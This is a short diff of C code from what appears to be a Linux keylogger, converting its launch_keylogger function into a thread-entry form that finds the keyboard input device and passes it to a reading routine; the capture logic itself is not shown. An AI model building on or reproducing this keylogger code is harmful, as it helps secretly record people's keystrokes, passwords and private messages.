@@ -233,14 +233,18 @@ char *parse_device_name()
     return event;
 }
 
-void launch_keylogger() {
+void *launch_keylogger(void *args) {
+    (void)args;
+
     char *event = parse_device_name();
     if (!event) {
         fprintf(stderr, "Impossible de trouver le périphérique clavier\n");
-        return ;
+        return NULL;
     }
     read_event(event);
     free(event);
+
+    return NULL;
 }
 
 // int main() {
